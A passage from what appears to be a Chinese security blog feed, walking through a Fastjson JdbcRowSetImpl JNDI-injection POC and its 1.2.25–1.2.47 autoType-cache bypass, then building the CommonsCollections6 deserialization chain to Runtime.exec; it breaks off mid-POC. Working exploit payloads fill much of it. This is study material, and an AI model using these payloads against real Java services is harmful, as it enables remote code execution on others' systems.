&#125;&#125;</code></pre><p>输出结果</p><pre><code>调用setAge()调用setName()调用getAge()调用getName()&#123;&quot;name&quot;:&quot;abc&quot;,&quot;age&quot;:18&#125;18</code></pre><p>如果给解析传的字符串中含有<code>@type</code>字段，就相当于指定一个类(如例子中的<code>org.example.Person</code>)，按照这个类去解析</p><p>调试分析：</p><p>调试到DefaultJSONParser.java，这里有一个判断，当json中key为“@type”并且满足<code>!lexer.isEnabled(Feature.DisableSpecialKeyDetect)</code></p><p>就会进入判断</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304092009321.png" alt="image-20230408222122119"></p><p>进入判断后，调用<code>TypeUtils.loadClass()</code>,将@type对应的value作为类对象加载</p><h2 id="反序列化利用链"><a href="#反序列化利用链" class="headerlink" title="反序列化利用链"></a>反序列化利用链</h2><p>fastjson的反序列化和原生反序列化不同的点：</p><ul><li>不需要实现Serializable</li><li>变量不需要非transient ,变量有对应的setter或者是public 或者是满足条件的getter</li><li>原生的反序列化的入口点是readObject,但fastjson是setter&#x2F;getter</li></ul><p>总的来说，和原生的反序列化漏洞不是一个东西，协议不同，fastjson在解析json数据的过程中进行的序列化操作，并且和原生的序列化操作不一样</p><p>这个序列化的漏洞点在<code>JdbcRowSetImpl</code>类中，</p><p>里面的connect方法如下</p><pre><code class="java">private Connection connect() throws SQLException &#123;    if (this.conn != null) &#123;        return this.conn;    &#125; else if (this.getDataSourceName() != null) &#123;        try &#123;            InitialContext var1 = new InitialContext();            DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());            return this.getUsername() != null &amp;&amp; !this.getUsername().equals(&quot;&quot;) ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();        &#125; catch (NamingException var3) &#123;            throw new SQLException(this.resBundle.handleGetObject(&quot;jdbcrowsetimpl.connect&quot;).toString());        &#125;    &#125; else &#123;        return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;    &#125;&#125;</code></pre><p>在第6,7行中可以看到它调用了 <code>InitialContext()</code>和 <code>lookup()</code> ，如果<code>this.getDataSourceName()</code>可控，这不妥妥的JNDI注入吗</p><p>查看一下<code>getDataSourceName()</code>，发现是直接返回<code>dataSource</code></p><pre><code class="java">public String getDataSourceName() &#123;    return dataSource;&#125;</code></pre><p><code>dataSource</code>,跟进查看得知，它是BaseRowSet类的一个私有属性，并且存在getter和setter方法</p><pre><code class="java">public String getDataSourceName() &#123;    return dataSource;&#125;</code></pre><pre><code class="java">public void setDataSourceName(String name) throws SQLException &#123;    if (name == null) &#123;        dataSource = null;    &#125; else if (name.equals(&quot;&quot;)) &#123;       throw new SQLException(&quot;DataSource name cannot be empty string&quot;);    &#125; else &#123;       dataSource = name;    &#125;    URL = null;&#125;</code></pre><p>这就很符合Java Bean的写法</p><p>到这里，我们是可以构造这样的POC</p><p><code>ldap://127.0.0.1:8085/VigsjhwY</code>,弹计算器的恶意类</p><pre><code class="java">String s = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://127.0.0.1:8085/VigsjhwY\&quot;&#125;&quot;;JSON.parseObject(s);</code></pre><p>但是这运行没法达到我们想要的结果</p><p>遇事不决，查找用法</p><p>这里查找connect()的用法，在<code>JdbcRowSetImpl</code>类中<code>setAutoCommit()</code>，找到了<code>connect()</code>，</p><pre><code class="java">public void setAutoCommit(boolean var1) throws SQLException &#123;    if (this.conn != null) &#123;        this.conn.setAutoCommit(var1);    &#125; else &#123;        this.conn = this.connect();        this.conn.setAutoCommit(var1);    &#125;&#125;public boolean getAutoCommit() throws SQLException &#123;    return this.conn.getAutoCommit();&#125;</code></pre><p>为了能够进入这个方法，还需要加上<code>AutoCommit</code>,解析的时候才会调用setter</p><p>因为它的参数是<code>boolean</code>类型的，传入个true或false,也可以传入0或1</p><p>最终POC</p><pre><code class="java">public class demo1 &#123;    public static void main(String[] args) &#123;        String s = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:8085/VigsjhwY\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;;        JSON.parseObject(s);        //JSON.parse(s)//使用这个也行    &#125;&#125;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304092011433.png" alt="image-20230409200759348"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304092011828.png" alt="image-20230409200831610"></p><h2 id="fastjson1-2-25-lt-x3D-1-2-47绕过"><a href="#fastjson1-2-25-lt-x3D-1-2-47绕过" class="headerlink" title="fastjson1.2.25&lt;&#x3D;1.2.47绕过"></a>fastjson1.2.25&lt;&#x3D;1.2.47绕过</h2><p>刚刚复现的版本是1.2.24的fastjson,在这个版本之前，fastjson没有做类加载的限制，导致任意代码执行的问题</p><p>在1.2.24之后对漏洞进行了修复</p><p>下面用的是1.2.25版本进行演示</p><pre><code class="xml">&lt;dependency&gt;  &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  &lt;version&gt;1.2.25&lt;/version&gt;&lt;/dependency&gt;</code></pre><p>再运行上次的payload直接报错</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304101836889.png" alt="image-20230410140121948"></p><p>经过调试发现，在DefaultJSONParser.java中，loadClass变成了<code>checkAutoType</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304101836261.png" alt="image-20230410141141798"></p><p>和之前的对比：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304092009321.png" alt="image-20230408222122119"></p><p>应该是这里出了问题，跟进去看看</p><p>发现之前的<code>TypeUtils.loadClass()</code>被丢到了判断里面了，并且按照之前的poc无法进入到判断里面</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304101836949.png" alt="image-20230410142236791"></p><p>进入判断后还有两个循环，一个白名单<code>acceptList</code>,这个默认是空的，另一个是黑名单，<code>denyList</code>，这个是有内容的，内容如下：</p><pre><code class="java">denyList        = &quot;bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework&quot;.split(&quot;,&quot;);</code></pre><p>可以看到<code>com.sun</code>在黑名单里面</p><p>这里的<code>TypeUtils.loadClass()</code>是用不了了，因为加载的类不在白名单里，换下一个</p><p>调试往下</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304101836822.png" alt="image-20230410155047075"></p><p><code>getClassFromMapping(typeName)</code>是查找缓存，就是加载过的类会放到Mapping里，就是缓存，到第二次加载的时候就不重新加载了，直接在缓存里找</p><p>如果loadClass的时候就把恶意类放到缓存里了，是不是就可以绕过check了</p><p>跟进去看看</p><pre><code class="java">public static Class&lt;?&gt; getClassFromMapping(String className) &#123;    return mappings.get(className);&#125;</code></pre><p>这里直接从mappings里面获取数据</p><p>现在的问题是如何在mappings里面存东西</p><p>ALT+F7,查找用法，在loadClass(String,ClassLoader)里找到可以控制参数的<code>mappings.put</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304101835506.png" alt="image-20230410161554305"></p><p>看看loadClass()</p><pre><code class="java">public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader)&#123;.....&#125;</code></pre><p>继续查找<code>loadClass</code>方法的调用</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304101835230.png" alt="image-20230410173820101"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304101835994.png" alt="image-20230410174149665"></p><p>有限制条件，只有满足<code>clazz == Class.class</code>才能进入,其中clazz是传进来的参数</p><pre><code class="java">public &lt;T&gt; T deserialze(DefaultJSONParser parser, Type clazz, Object fieldName)&#123;&#125;</code></pre><p>看一下所在的类</p><pre><code class="java">public class MiscCodec implements ObjectSerializer, ObjectDeserializer&#123;&#125;</code></pre><p>在这可以知道<code>MiscCodec</code>实现了两个接口，是一个序列化和反序列化器</p><p>经过调试过程中发现，反序列化是在这里获取的</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304101835023.png" alt="image-20230410175101694"></p><p>通过config找到对应的反序列化器，当类为<code>Class.class</code>的时候就会调用<code>MiscCodec</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304101835579.png" alt="image-20230410175526180"></p><p>回到这里</p><pre><code class="java">if (clazz == Class.class) &#123;    return (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());&#125;</code></pre><p><code>strVal</code>是传进来的字符串，当loadClass执行后，会把类名加载，然后放到缓存里</p><p>整个流程中，最主要的漏洞在于，当查找缓存的时候，查找到了就会返回这个类</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304101835253.png" alt="image-20230410181347378"></p><p>第一步先让它进行正常的加载，把恶意类放到缓存里</p><pre><code class="java">&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;</code></pre><p>第二不就是加载恶意类，通过从缓存里查找来绕过类型检查java</p><pre><code class="java">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:8085/XzfLalyY&quot;,&quot;autoCommit&quot;:true&#125;</code></pre><p>最后的POC</p><pre><code class="java">package org.example;import com.alibaba.fastjson.JSON;public class demo1 &#123;    public static void main(String[] args) &#123;        String s = &quot;&#123;&#123;\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"&#125;,&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:8085/XzfLalyY\",\"autoCommit\":true&#125;&#125;&quot;;        JSON.parse(s);    &#125;&#125;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304101835796.png" alt="image-20230410182733010"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollections6</title>
      <link href="/2023/04/06/CommonsCollections6/"/>
      <url>/2023/04/06/CommonsCollections6/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前几天搞的CC1没成功弹出计算器，后来查找发现，是jdk版本问题，8u71之后已修复不可利用，主要原因是 <code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code> 的逻辑变化了</p><p>CommonsCollections6 解决了高版本 Jdk 的利用问题，所以来学习一下（主要是懒得安装其低版本的jdk）</p><h2 id="利用链的限制条件："><a href="#利用链的限制条件：" class="headerlink" title="利用链的限制条件："></a>利用链的限制条件：</h2><p> JDK 版本：暂无限制、 CommonsCollections 3.1 - 3.2.1</p><h2 id="利用链："><a href="#利用链：" class="headerlink" title="利用链："></a>利用链：</h2><pre><code>    Gadget chain:        java.io.ObjectInputStream.readObject()            java.util.HashSet.readObject()                java.util.HashMap.put()                java.util.HashMap.hash()                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()                        org.apache.commons.collections.map.LazyMap.get()                            org.apache.commons.collections.functors.ChainedTransformer.transform()                            org.apache.commons.collections.functors.InvokerTransformer.transform()                            java.lang.reflect.Method.invoke()                                java.lang.Runtime.exec()</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>老方法，看着利用链来往上分析，虽然有部分是和CC1是一样的，但是还是想分析巩固一下</p><ul><li>第一层 <code>java.lang.Runtime.exec()</code></li></ul><pre><code class="java">Runtime.getRuntime().exec(&quot;calc&quot;);</code></pre><ul><li>第二层<code>java.lang.reflect.Method.invoke()</code></li></ul><p>这个就是反射调用</p><pre><code class="java">Runtime r = Runtime.getRuntime();Class c =Runtime.class;Method execMethod  = c.getMethod(&quot;exec&quot;,String.class);execMethod.invoke(r,&quot;calc&quot;);</code></pre><p>因为Runtime⽆法序列化，<code>Runtime.class</code>是可以序列化的,所以改成这样</p><pre><code class="java">Class c =Runtime.class;Method getRuntime = c.getMethod(&quot;getRuntime&quot;, null);Runtime r = (Runtime) getRuntime.invoke(null, null);Method exec = c.getMethod(&quot;exec&quot;, String.class);exec.invoke(r,&quot;calc&quot;);</code></pre><ul><li>第三层<code>org.apache.commons.collections.functors.InvokerTransformer.transform()</code></li></ul><p>这里查看一下<code>InvokerTransformer</code>这个类的<code>transform()</code>方法</p><pre><code class="java">public Object transform(Object input) &#123;        if (input == null) &#123;            return null;        &#125;        try &#123;            Class cls = input.getClass();            Method method = cls.getMethod(iMethodName, iParamTypes);            return method.invoke(input, iArgs);                        &#125; catch (NoSuchMethodException ex) &#123;            throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; does not exist&quot;);        &#125; catch (IllegalAccessException ex) &#123;            throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; cannot be accessed&quot;);        &#125; catch (InvocationTargetException ex) &#123;            throw new FunctorException(&quot;InvokerTransformer: The method &#39;&quot; + iMethodName + &quot;&#39; on &#39;&quot; + input.getClass() + &quot;&#39; threw an exception&quot;, ex);        &#125;    &#125;</code></pre><p>这个方法，传入一个对象，在正常的情况下，通过反射，执行对象的方法，对比一下第二层就知道了，这里有点后门意思</p><p>查看<code>InvokerTransformer</code>的构造方法，发现<code>iMethodName</code>,<code>iParamTypes</code>,<code>iArgs</code>这几个参数可控</p><pre><code class="java">public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;        super();        iMethodName = methodName;        iParamTypes = paramTypes;        iArgs = args;    &#125;</code></pre><p>那么我们就可以这么构造，执行命令</p><pre><code class="java">//Class c =Runtime.class;//Method getRuntime = c.getMethod(&quot;getRuntime&quot;, null);Method getRuntimeMethod = (Method) new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);//Runtime r = (Runtime) getRuntime.invoke(null, null);Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;).transform(getRuntimeMethod);//Method exec = c.getMethod(&quot;exec&quot;, String.class).invoke(r,&quot;calc&quot;);new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</code></pre><ul><li>第四层<code>org.apache.commons.collections.functors.ChainedTransformer.transform()</code></li></ul><p>这一层相当于把上面一层的代码优化一下，可以发现上面执行命令的过程中，前一步的输出是后一步的输入</p><p>查看<code>ChainedTransformer.transform()</code></p><pre><code class="java">    public Object transform(Object object) &#123;        for (int i = 0; i &lt; iTransformers.length; i++) &#123;            object = iTransformers[i].transform(object);        &#125;        return object;    &#125;</code></pre><p>这里就是实现了递归调用，把前一步的输出，当成后一步的输入</p><p>查看<code>ChainedTransformer</code>的构造函数</p><pre><code class="java">public ChainedTransformer(Transformer[] transformers) &#123;        super();        iTransformers = transformers;    &#125;</code></pre><p>这里只要传进一个<code>transformers</code>数组,然后递归调用</p><p>构造代码如下</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;        new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),        new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null, null&#125;),        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);chainedTransformer.transform(Runtime.class);</code></pre><ul><li>第五层<code>org.apache.commons.collections.map.LazyMap.get()</code></li></ul><p>查看<code>LazyMap</code>类,<code>LazyMap</code>是只要执行 get 方法就会调用<strong>transform</strong>，</p><pre><code class="java">public Object get(Object key) &#123;        // create value for key if key is not currently in the map        if (map.containsKey(key) == false) &#123;            Object value = factory.transform(key);            map.put(key, value);            return value;        &#125;        return map.get(key);    &#125;</code></pre><p>这里可以看出，如果<code>factory</code>改为上层代码的<code>chainedTransformer</code>就可以执行命令了</p><p>但是这里有个if判断，大概的意思是，如果map里面有<code>key</code>,直接返回，如果没有则进入判断，把value补上</p><p>其中的<code>this.factory</code>对象，可以通过调用decorate(Map map, Transformer factory)方法，进而调用LazyMap(Map map, Factory factory)构造方法进行控制</p><pre><code class="java">public static Map decorate(Map map, Transformer factory) &#123;        return new LazyMap(map, factory);    &#125;</code></pre><pre><code class="java">protected LazyMap(Map map, Factory factory) &#123;        super(map);        if (factory == null) &#123;            throw new IllegalArgumentException(&quot;Factory must not be null&quot;);        &#125;        this.factory = FactoryTransformer.getInstance(factory);    &#125;</code></pre><p>所以构造代码如下：</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;        new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),        new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null, null&#125;),        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);HashMap innermap = new HashMap();LazyMap map = (LazyMap)LazyMap.decorate(innermap,chainedTransformer);map.get(Runtime.class);</code></pre><ul><li>第六层<code>org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</code></li></ul><p>查看<code>TiedMapEntry</code>类，里面只有<code>getValue()</code>调用了<code>get()</code></p><pre><code class="java">public Object getValue() &#123;    return map.get(key);&#125;</code></pre><p>查看构造方法</p><pre><code class="java">public TiedMapEntry(Map map, Object key) &#123;    super();    this.map = map;    this.key = key;&#125;</code></pre><p>发现<code>map</code>和<code>key</code>都是可以控制的</p><p>所以构造方法如下：</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;      new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),      new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null, null&#125;),      new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);HashMap innermap = new HashMap();LazyMap map = (LazyMap)LazyMap.decorate(innermap,chainedTransformer);//只加了这两行TiedMapEntry tiedmap = new TiedMapEntry(map,Runtime.class);tiedmap.getValue();</code></pre><ul><li>第七层<code>org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</code></li></ul><p>刚刚是使用了<code>TiedMapEntry.getValue()</code>, 在<code>TiedMapEntry</code>类中，有几个方法用到了<code>getValue()</code></p><p>其中就有<code>hashCode()</code> ————–(为啥要用这个？到后面就知道了)</p><pre><code class="java">public int hashCode() &#123;        Object value = getValue();        return (getKey() == null ? 0 : getKey().hashCode()) ^               (value == null ? 0 : value.hashCode());     &#125;</code></pre><p>首先通过getValue()方法获取对象的值并赋给value变量，然后使用异或操作符 ^ 计算对象的哈希码。该方法的计算方式是将键（Key）的哈希码和值（Value）的哈希码异或在一起。</p><p>所以把上面的<code>tiedmap.getValue();</code>改为<code>tiedmap.hashCode();</code>就行了</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;  new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),  new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null, null&#125;),  new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);HashMap innermap = new HashMap();LazyMap map = (LazyMap)LazyMap.decorate(innermap,chainedTransformer);TiedMapEntry tiedmap = new TiedMapEntry(map,Runtime.class);//就改了这里tiedmap.hashCode();</code></pre><ul><li>第八层<code>java.util.HashMap.hash()</code></li></ul><p>查看<code>HashMap.hash()</code> </p><pre><code class="java">static final int hash(Object key) &#123;    int h;    return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);&#125;</code></pre><p>该方法会判断传入的key是否为null，如果为null则直接返回0。如果key不为null，则通过key.hashCode()方法获取该Key的哈希码，并将结果存储在变量h中。然后将h和右移16位后的h按位异或运算( ^ )，得到最终的哈希码值并返回。</p><p> 我们不需要它的返回结果，只要他执行hashCode()就行</p><p>因为hash方法是HashMap类中的私有静态方法，无法从外部程序包中对其进行访问，可以用反射来调用它</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null, null&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);HashMap innermap = new HashMap();LazyMap map = (LazyMap)LazyMap.decorate(innermap,chainedTransformer);TiedMapEntry tiedmap = new TiedMapEntry(map,Runtime.class);        //反射调用Class&lt;?&gt; hashMapClass = HashMap.class;Method hashMethod = hashMapClass.getDeclaredMethod(&quot;hash&quot;, Object.class);hashMethod.setAccessible(true);//设置访问权限hashMethod.invoke(null, tiedmap);</code></pre><ul><li>第九层<code>java.util.HashMap.put()</code></li></ul><p><code>put()</code>方法的代码如下</p><pre><code class="java">public V put(K key, V value) &#123;    return putVal(hash(key), key, value, false, true);&#125;</code></pre><p>这里只要我们只要put(tiedmap,”23131”)就可以触发hash(key)了，既hash(tiedmap)</p><p>所以到这一层的代码构造如下：</p><pre><code class="java">Transformer[] transformers = new Transformer[]&#123;     new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),     new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null, null&#125;),     new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);HashMap innermap = new HashMap();LazyMap map = (LazyMap)LazyMap.decorate(innermap,chainedTransformer);TiedMapEntry tiedmap = new TiedMapEntry(map,Runtime.class);HashMap&lt;Object,Object&gt; hashMap=new HashMap&lt;&gt;();hashMap.put(tiedmap,&quot;12333&quot;);</code></pre><ul><li>第十层<code>java.util.HashSet.readObject()</code></li></ul><p>很明显，这里已经是链子的末尾了，HashSet重写了<code>readObject()</code>,既反序列化入口</p><p>先来看一下这个<code>readObject()</code>的代码</p><pre><code class="java">private void readObject(java.io.ObjectInputStream s)    throws java.io.IOException, ClassNotFoundException &#123;    // Consume and ignore stream fields (currently zero).    s.readFields();    // Read capacity and verify non-negative.    int capacity = s.readInt();    if (capacity &lt; 0) &#123;        throw new InvalidObjectException(&quot;Illegal capacity: &quot; +                                         capacity);    &#125;    // Read load factor and verify positive and non NaN.    float loadFactor = s.readFloat();    if (loadFactor &lt;= 0 || Float.isNaN(loadFactor)) &#123;        throw new InvalidObjectException(&quot;Illegal load factor: &quot; +                                         loadFactor);    &#125;    // Clamp load factor to range of 0.25...4.0.    loadFactor = Math.min(Math.max(0.25f, loadFactor), 4.0f);    // Read size and verify non-negative.    int size = s.readInt();    if (size &lt; 0) &#123;        throw new InvalidObjectException(&quot;Illegal size: &quot; + size);    &#125;    // Set the capacity according to the size and load factor ensuring that    // the HashMap is at least 25% full but clamping to maximum capacity.    capacity = (int) Math.min(size * Math.min(1 / loadFactor, 4.0f),            HashMap.MAXIMUM_CAPACITY);    // Constructing the backing map will lazily create an array when the first element is    // added, so check it before construction. Call HashMap.tableSizeFor to compute the    // actual allocation size. Check Map.Entry[].class since it&#39;s the nearest public type to    // what is actually created.    SharedSecrets.getJavaOISAccess()                 .checkArray(s, Map.Entry[].class, HashMap.tableSizeFor(capacity));    // Create backing HashMap    map = (((HashSet&lt;?&gt;)this) instanceof LinkedHashSet ?           new LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) :           new HashMap&lt;E,Object&gt;(capacity, loadFactor));    // Read in all elements in the proper order.    for (int i=0; i&lt;size; i++) &#123;        @SuppressWarnings(&quot;unchecked&quot;)            E e = (E) s.readObject();        map.put(e, PRESENT);    &#125;</code></pre><p>重点在这里，<code>s</code>是可控的，但是要如何确保<code>e</code>为我们想要的<code>tiedmap</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304062210181.png" alt="image-20230406205619715"></p><p>这里的 map 实际上就是 HashMap </p><pre><code class="java">private transient HashMap&lt;E,Object&gt; map;</code></pre><p>那么当执行到了<code>E e = (E) s.readObject();</code>，这段代码中先反序列化TiedMapEntry对象tiedmap，TiedMapEntry的对象如下内容</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/202304071244516.png" alt="image-20230407124422576"></p><p>这里可以看到map和key是可控的，但是这个map和key已经被我们构造好的payload进行了填充，</p><p>看一下 <code>HashSet</code> 中的序列化过程（writeObject）是否可控</p><p><code>HashSet.writeObject()</code>的代码如下</p><pre><code class="java">private void writeObject(java.io.ObjectOutputStream s)    throws java.io.IOException &#123;    // Write out any hidden serialization magic    s.defaultWriteObject();    // Write out HashMap capacity and load factor    s.writeInt(map.capacity());    s.writeFloat(map.loadFactor());    // Write out size    s.writeInt(map.size());    // Write out all elements in the proper order.    for (E e : map.keySet())        s.writeObject(e);&#125;</code></pre><p>传入的key是来自E e，这在writeObject中写明了来自其map成员</p><p>而 <strong>map</strong> ，我们可以在 HashSet 中看到并没有一个直接的方法可以直接赋值修改的，这就又要用到反射了</p><pre><code class="java">// 指定初始容量为1HashSet hashSet = new HashSet(1);hashSet.add(&quot;T0dis&quot;);// 反射获取HashSet中map的值Field HashSet_map =  Class.forName(&quot;java.util.HashSet&quot;).getDeclaredField(&quot;map&quot;);// 取消访问限制检查HashSet_map.setAccessible(true);// 获取HashSet中map的值HashMap hashSetMap = (HashMap) HashSet_map.get(hashSet);</code></pre><p>然后修改 hashSetMap 中的 key 值为 hashset</p><pre><code class="java">// 反射获取 HashMap 中 table 的值Field table =  Class.forName(&quot;java.util.HashMap&quot;).getDeclaredField(&quot;table&quot;);// 取消访问限制检查table.setAccessible(true);// 获取 HashMap 中 table 的值Object[] hashMapTable = (Object[]) table.get(hashSetMap);Object node = hashMapTable[0];if(node == null) &#123;      node = hashMapTable[1];&#125;// 将key 设为 tiedmapField key =  node.getClass().getDeclaredField(&quot;key&quot;);key.setAccessible(true);key.set(node, tiedmap);</code></pre><p>在这里利用反射获取了 hashSetMap 中的 table 属性，table 其实就是 hashmap 的存储底层，将 &lt;Key,Value&gt; 封装在了 Node 对象中，在获取到了 table 中的 key 之后，利用反射修改其为 tiedmap</p><ul><li>第十一层<code>java.io.ObjectInputStream.readObject()</code></li></ul><p>这个就是序列化的过程了</p><p>序列化和反序列化的代码如下</p><pre><code class="java">public static void serialize(Object obj) throws IOException&#123;    ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));    oos.writeObject(obj);&#125;public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;    ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));    Object obj = ois.readObject();    return obj;&#125;</code></pre><h2 id="最终POC"><a href="#最终POC" class="headerlink" title="最终POC"></a>最终POC</h2><pre><code class="java">package org.example;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import org.apache.commons.collections.keyvalue.TiedMapEntry;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import java.util.HashSet;public class CC6 &#123;    public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, NoSuchFieldException, IOException &#123;        Transformer[] transformers = new Transformer[]&#123;                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null, null&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);        HashMap innermap = new HashMap();        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chainedTransformer);        TiedMapEntry tiedmap = new TiedMapEntry(map,Runtime.class);        HashSet hashSet = new HashSet(1);        